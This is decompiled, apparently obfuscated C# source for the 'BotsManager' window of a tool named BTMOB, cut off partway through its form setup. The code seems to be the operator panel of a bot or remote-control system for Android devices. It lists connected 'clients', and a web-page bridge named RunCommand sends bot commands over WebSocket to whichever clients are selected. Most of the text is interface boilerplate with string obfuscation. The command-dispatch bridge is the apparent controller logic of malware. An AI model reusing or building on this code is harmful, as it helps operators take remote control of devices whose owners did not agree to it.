using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;

namespace BTMOB;

[DesignerGenerated]
public class BotsManager : Form
{
	[ComVisible(true)]
	public class mybridge
	{
		[CompilerGenerated]
		internal sealed class _Closure_0024__2_002D0
		{
			public string _0024VB_0024Local_thename;

			public string _0024VB_0024Local_thecommand;

			public mybridge _0024VB_0024Me;

			public _Closure_0024__2_002D0(_Closure_0024__2_002D0 arg0)
			{
				if (arg0 != null)
				{
					_0024VB_0024Local_thename = arg0._0024VB_0024Local_thename;
					_0024VB_0024Local_thecommand = arg0._0024VB_0024Local_thecommand;
				}
			}

			[SpecialName]
			internal void _Lambda_0024__0()
			{
				bool flag = true;
				_0024VB_0024Me.mainform.DGVC.EndEdit();
				foreach (DataGridViewRow item in (IEnumerable)_0024VB_0024Me.mainform.DGVC.Rows)
				{
					bool flag2 = false;
					if (item.Cells[0].Value != null && item.Cells[0].Value != DBNull.Value)
					{
						flag2 = Convert.ToBoolean(RuntimeHelpers.GetObjectValue(item.Cells[0].Value));
					}
					if (flag2)
					{
						string text = Conversions.ToString(item.Tag);
						ServersInfo serversInfo = (ServersInfo)item.Cells[0].Tag;
						if (Operators.CompareString(text, "-1", TextCompare: false) != 0)
						{
							Dictionary<string, object> chatData = new Dictionary<string, object>
							{
								{ "msg", "bot" },
								{ "subc", "S" },
								{ "botn", _0024VB_0024Local_thename },
								{ "botc", _0024VB_0024Local_thecommand }
							};
							BTEngine.commands(chatData, text, serversInfo.WSClient);
							Thread.Sleep(1);
							flag = false;
						}
					}
				}
				if (flag)
				{
					BTAlerter.infos("Select clients first");
				}
			}
		}

		public BotsManager mainform;

		public mybridge(BotsManager minme)
		{
			mainform = minme;
		}

		[DispId(1)]
		public void RunCommand(string thename, string thecommand)
		{
			_Closure_0024__2_002D0 arg = default(_Closure_0024__2_002D0);
			_Closure_0024__2_002D0 CS_0024_003C_003E8__locals7 = new _Closure_0024__2_002D0(arg);
			CS_0024_003C_003E8__locals7._0024VB_0024Me = this;
			CS_0024_003C_003E8__locals7._0024VB_0024Local_thename = thename;
			CS_0024_003C_003E8__locals7._0024VB_0024Local_thecommand = thecommand;
			mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				bool flag = true;
				CS_0024_003C_003E8__locals7._0024VB_0024Me.mainform.DGVC.EndEdit();
				foreach (DataGridViewRow item in (IEnumerable)CS_0024_003C_003E8__locals7._0024VB_0024Me.mainform.DGVC.Rows)
				{
					bool flag2 = false;
					if (item.Cells[0].Value != null && item.Cells[0].Value != DBNull.Value)
					{
						flag2 = Convert.ToBoolean(RuntimeHelpers.GetObjectValue(item.Cells[0].Value));
					}
					if (flag2)
					{
						string text = Conversions.ToString(item.Tag);
						ServersInfo serversInfo = (ServersInfo)item.Cells[0].Tag;
						if (Operators.CompareString(text, "-1", TextCompare: false) != 0)
						{
							Dictionary<string, object> chatData = new Dictionary<string, object>
							{
								{ "msg", "bot" },
								{ "subc", "S" },
								{ "botn", CS_0024_003C_003E8__locals7._0024VB_0024Local_thename },
								{ "botc", CS_0024_003C_003E8__locals7._0024VB_0024Local_thecommand }
							};
							BTEngine.commands(chatData, text, serversInfo.WSClient);
							Thread.Sleep(1);
							flag = false;
						}
					}
				}
				if (flag)
				{
					BTAlerter.infos("Select clients first");
				}
			}));
		}

		[DispId(2)]
		public void Alerter(string msg)
		{
			mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				BTAlerter.infos(msg);
			}));
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGVC")]
	private DataGridView _DGVC;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("refresher")]
	private BackgroundWorker _refresher;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("bottitle")]
	private Label _bottitle;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel4")]
	private Panel _Panel4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("pinbtn")]
	private DrakeUIButtonIcon _pinbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("closbtn")]
	private DrakeUIButtonIcon _closbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("minibtn")]
	private DrakeUIButtonIcon _minibtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeWidth_W8")]
	private DrakeWidth_W _DrakeWidth_W8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeWidth_W7")]
	private DrakeWidth_W _DrakeWidth_W7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("srchbtn")]
	private DrakeUIButtonIcon _srchbtn;

	public List<BTClient> listclients;

	public Dictionary<string, DataGridViewRow> dgvlink;

	private Bitmap emptyimg;

	private bool ialive;

	private int Mx;

	private int Sw;

	private bool movX;

	private int Myyy;

	private int Sh;

	private bool movY;

	private List<string> skiplist;

	private bool keepmeto;

	private AndroidViewer AV;

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("BotsView")]
	internal virtual WebView2 BotsView
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DataGridView DGVC
	{
		[CompilerGenerated]
		get
		{
			return _DGVC;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellEventHandler value2 = DGVC_CellContentClick;
			DataGridViewCellEventHandler value3 = DGVC_CellMouseEnter;
			DataGridViewCellEventHandler value4 = DGVC_CellMouseLeave;
			DataGridViewCellPaintingEventHandler value5 = DGVPRIMB_CellPainting;
			DataGridViewCellEventHandler value6 = DGVPRIMB_CellClick;
			DataGridView dataGridView = _DGVC;
			if (dataGridView != null)
			{
				dataGridView.CellContentClick -= value2;
				dataGridView.CellMouseEnter -= value3;
				dataGridView.CellMouseLeave -= value4;
				dataGridView.CellPainting -= value5;
				dataGridView.CellClick -= value6;
			}
			_DGVC = value;
			dataGridView = _DGVC;
			if (dataGridView != null)
			{
				dataGridView.CellContentClick += value2;
				dataGridView.CellMouseEnter += value3;
				dataGridView.CellMouseLeave += value4;
				dataGridView.CellPainting += value5;
				dataGridView.CellClick += value6;
			}
		}
	}

	internal virtual BackgroundWorker refresher
	{
		[CompilerGenerated]
		get
		{
			return _refresher;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = refresher_DoWork;
			BackgroundWorker backgroundWorker = _refresher;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_refresher = value;
			backgroundWorker = _refresher;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	internal virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel3_MouseDown;
			Panel panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel3 = value;
			panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel3_MouseDown;
			PictureBox pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
			}
			_PictureBox1 = value;
			pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
			}
		}
	}

	internal virtual Label bottitle
	{
		[CompilerGenerated]
		get
		{
			return _bottitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel3_MouseDown;
			Label label = _bottitle;
			if (label != null)
			{
				label.MouseDown -= value2;
			}
			_bottitle = value;
			label = _bottitle;
			if (label != null)
			{
				label.MouseDown += value2;
			}
		}
	}

	internal virtual Panel Panel4
	{
		[CompilerGenerated]
		get
		{
			return _Panel4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel3_MouseDown;
			Panel panel = _Panel4;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel4 = value;
			panel = _Panel4;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	public virtual DrakeUIButtonIcon pinbtn
	{
		[CompilerGenerated]
		get
		{
			return _pinbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = pinbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _pinbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_pinbtn = value;
			drakeUIButtonIcon = _pinbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("spl2")]
	internal virtual DrakeWidth_W spl2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DrakeUIButtonIcon closbtn
	{
		[CompilerGenerated]
		get
		{
			return _closbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = closbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_closbtn = value;
			drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W1")]
	internal virtual DrakeWidth_W DrakeWidth_W1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DrakeUIButtonIcon minibtn
	{
		[CompilerGenerated]
		get
		{
			return _minibtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = minibtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _minibtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_minibtn = value;
			drakeUIButtonIcon = _minibtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W5")]
	internal virtual DrakeWidth_W DrakeWidth_W5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeWidth_W DrakeWidth_W8
	{
		[CompilerGenerated]
		get
		{
			return _DrakeWidth_W8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = DrakeWidth_W8_MouseDown;
			MouseEventHandler value3 = DrakeWidth_W8_MouseMove;
			MouseEventHandler value4 = DrakeWidth_W8_MouseUp;
			DrakeWidth_W drakeWidth_W = _DrakeWidth_W8;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown -= value2;
				drakeWidth_W.MouseMove -= value3;
				drakeWidth_W.MouseUp -= value4;
			}
			_DrakeWidth_W8 = value;
			drakeWidth_W = _DrakeWidth_W8;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown += value2;
				drakeWidth_W.MouseMove += value3;
				drakeWidth_W.MouseUp += value4;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W6")]
	internal virtual DrakeWidth_W DrakeWidth_W6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeWidth_W DrakeWidth_W7
	{
		[CompilerGenerated]
		get
		{
			return _DrakeWidth_W7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = DrakeWidth_W7_MouseDown;
			MouseEventHandler value3 = DrakeWidth_W7_MouseMove;
			MouseEventHandler value4 = DrakeWidth_W7_MouseUp;
			DrakeWidth_W drakeWidth_W = _DrakeWidth_W7;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown -= value2;
				drakeWidth_W.MouseMove -= value3;
				drakeWidth_W.MouseUp -= value4;
			}
			_DrakeWidth_W7 = value;
			drakeWidth_W = _DrakeWidth_W7;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown += value2;
				drakeWidth_W.MouseMove += value3;
				drakeWidth_W.MouseUp += value4;
			}
		}
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("slctclum")]
	internal virtual DataGridViewCheckBoxColumn slctclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("apicoclm")]
	internal virtual DataGridViewImageColumn apicoclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numnamclm")]
	internal virtual DataGridViewTextBoxColumn numnamclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clistat")]
	internal virtual DataGridViewTextBoxColumn clistat
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("abortclumn")]
	internal virtual DataGridViewImageColumn abortclumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon srchbtn
	{
		[CompilerGenerated]
		get
		{
			return _srchbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = srchbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _srchbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_srchbtn = value;
			drakeUIButtonIcon = _srchbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public BotsManager()
	{
		base.Load += BotsManager_Load;
		base.FormClosing += BotsManager_FormClosing;
		listclients = new List<BTClient>();
		dgvlink = new Dictionary<string, DataGridViewRow>();
		ialive = true;
		skiplist = new List<string>();
		keepmeto = true;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.BotsManager));
		this.Panel1 = new System.Windows.Forms.Panel();
		this.BotsView = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.srchbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.DGVC = new System.Windows.Forms.DataGridView();
		this.slctclum = new System.Windows.Forms.DataGridViewCheckBoxColumn();
		this.apicoclm = new System.Windows.Forms.DataGridViewImageColumn();
		this.numnamclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.clistat = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.abortclumn = new System.Windows.Forms.DataGridViewImageColumn();
		this.Label2 = new System.Windows.Forms.Label();
		this.refresher = new System.ComponentModel.BackgroundWorker();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.pinbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W1 = new DrakeUI.Framework.DrakeWidth_W();
		this.minibtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.spl2 = new DrakeUI.Framework.DrakeWidth_W();
		this.closbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.bottitle = new System.Windows.Forms.Label();
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.DrakeWidth_W5 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W8 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W6 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W7 = new DrakeUI.Framework.DrakeWidth_W();
		this.Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.BotsView).BeginInit();
		this.Panel5.SuspendLayout();
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVC).BeginInit();
		this.Panel3.SuspendLayout();
		this.Panel4.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		base.SuspendLayout();
		this.Panel1.BackColor = System.Drawing.SystemColors.ControlDark;
		this.Panel1.Controls.Add(this.BotsView);
		this.Panel1.Controls.Add(this.Panel5);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.Location = new System.Drawing.Point(434, 67);
		this.Panel1.Name = EXGuarder._6416375D;
		this.Panel1.Size = new System.Drawing.Size(1200, 710);
		this.Panel1.TabIndex = 0;
		this.BotsView.AllowExternalDrop = true;
		this.BotsView.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.BotsView.CreationProperties = null;
		this.BotsView.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.BotsView.Dock = System.Windows.Forms.DockStyle.Fill;
		this.BotsView.ForeColor = System.Drawing.Color.White;
		this.BotsView.Location = new System.Drawing.Point(0, 50);
		this.BotsView.Name = EXGuarder._6C005C13;
		this.BotsView.Size = new System.Drawing.Size(1200, 660);
		this.BotsView.TabIndex = 0;
		this.BotsView.ZoomFactor = 1.0;
		this.Panel5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel5.Controls.Add(this.srchbtn);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel5.Location = new System.Drawing.Point(0, 0);
		this.Panel5.Name = EXGuarder._0F66432B;
		this.Panel5.Padding = new System.Windows.Forms.Padding(8);
		this.Panel5.Size = new System.Drawing.Size(1200, 50);
		this.Panel5.TabIndex = 1;
		this.srchbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.srchbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.srchbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.srchbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.srchbtn.Font = new System.Drawing.Font(EXGuarder._2D11553E, 9f);
		this.srchbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.srchbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.srchbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.srchbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.srchbtn.Location = new System.Drawing.Point(1030, 8);
		this.srchbtn.Name = EXGuarder._003A4779;
		this.srchbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.srchbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.srchbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.srchbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.srchbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.srchbtn.Size = new System.Drawing.Size(162, 34);
		this.srchbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.srchbtn.Symbol = 61641;
		this.srchbtn.TabIndex = 48;
		this.srchbtn.Text = EXGuarder._2349240B;
		this.Panel2.BackColor = System.Drawing.SystemColors.ControlText;
		this.Panel2.Controls.Add(this.DGVC);
		this.Panel2.Controls.Add(this.Label2);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel2.Location = new System.Drawing.Point(2, 67);
		this.Panel2.Name = EXGuarder._53782D71;
		this.Panel2.Padding = new System.Windows.Forms.Padding(8);
		this.Panel2.Size = new System.Drawing.Size(432, 710);
		this.Panel2.TabIndex = 1;
		this.DGVC.AllowUserToAddRows = false;
		this.DGVC.AllowUserToDeleteRows = false;
		this.DGVC.AllowUserToResizeColumns = false;
		this.DGVC.AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGVC.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVC.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVC.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGVC.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGVC.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGVC.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		this.DGVC.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle2.Font = new System.Drawing.Font(EXGuarder._2D11553E, 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGVC.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVC.Columns.AddRange(this.slctclum, this.apicoclm, this.numnamclm, this.clistat, this.abortclumn);
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle3.Font = new System.Drawing.Font(EXGuarder._2D11553E, 9f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGVC.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVC.EnableHeadersVisualStyles = false;
		this.DGVC.GridColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGVC.Location = new System.Drawing.Point(8, 39);
		this.DGVC.MultiSelect = false;
		this.DGVC.Name = EXGuarder._3C610D23;
		this.DGVC.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle4.Font = new System.Drawing.Font(EXGuarder._2D11553E, 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGVC.RowHeadersVisible = false;
		this.DGVC.RowHeadersWidth = 51;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGVC.RowTemplate.Height = 24;
		this.DGVC.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVC.ShowCellErrors = false;
		this.DGVC.ShowEditingIcon = false;
		this.DGVC.ShowRowErrors = false;
		this.DGVC.Size = new System.Drawing.Size(416, 663);
		this.DGVC.TabIndex = 43;
		this.slctclum.FillWeight = 25f;
		this.slctclum.HeaderText = EXGuarder._04326531;
		this.slctclum.MinimumWidth = 6;
		this.slctclum.Name = EXGuarder._70030706;
		this.apicoclm.FillWeight = 35f;
		this.apicoclm.HeaderText = EXGuarder._04326531;
		this.apicoclm.MinimumWidth = 6;
		this.apicoclm.Name = EXGuarder._07702E14;
		this.apicoclm.ReadOnly = true;
		this.numnamclm.HeaderText = EXGuarder._04326531;
		this.numnamclm.MinimumWidth = 6;
		this.numnamclm.Name = EXGuarder._1D446B01;
		this.numnamclm.ReadOnly = true;
		this.clistat.HeaderText = EXGuarder._04326531;
		this.clistat.MinimumWidth = 6;
		this.clistat.Name = EXGuarder._38792548;
		this.clistat.ReadOnly = true;
		this.abortclumn.FillWeight = 18f;
		this.abortclumn.HeaderText = EXGuarder._04326531;
		this.abortclumn.ImageLayout = System.Windows.Forms.DataGridViewImageCellLayout.Zoom;
		this.abortclumn.MinimumWidth = 6;
		this.abortclumn.Name = EXGuarder._480A292D;
		this.Label2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Label2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label2.Font = new System.Drawing.Font(EXGuarder._2D11553E, 9f, System.Drawing.FontStyle.Bold);
		this.Label2.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.Label2.Location = new System.Drawing.Point(8, 8);
		this.Label2.Name = EXGuarder._73010B4A;
		this.Label2.Padding = new System.Windows.Forms.Padding(5);
		this.Label2.Size = new System.Drawing.Size(416, 31);
		this.Label2.TabIndex = 44;
		this.Label2.Text = EXGuarder._2C6D4972;
		this.Label2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.Panel4);
		this.Panel3.Controls.Add(this.bottitle);
		this.Panel3.Controls.Add(this.PictureBox1);
